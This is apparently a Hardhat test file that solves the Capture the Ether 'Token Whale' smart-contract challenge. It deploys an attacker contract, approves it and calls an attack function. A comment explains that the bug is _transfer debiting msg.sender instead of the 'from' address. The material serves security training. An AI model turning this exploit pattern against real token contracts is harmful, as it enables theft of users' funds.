const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Token Whale', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('TokenWhaleChallenge', deployer);
        this.tokenWhale = await Factory.deploy(attacker.address);
    });
    //The _transfer function updates the balance from msg.sender and not of "from"
    it('Exploit', async function () {
        const Factory = await ethers.getContractFactory('TokenWhaleChallengeAttacker', attacker);
        let attackerContract = await Factory.deploy();
        const tokenWhaleAttacker = this.tokenWhale.connect(attacker);
        await tokenWhaleAttacker.approve(attackerContract.address, 1000);
        await attackerContract.attack(this.tokenWhale.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.tokenWhale.isComplete()
        ).to.be.eq(true);
    });
});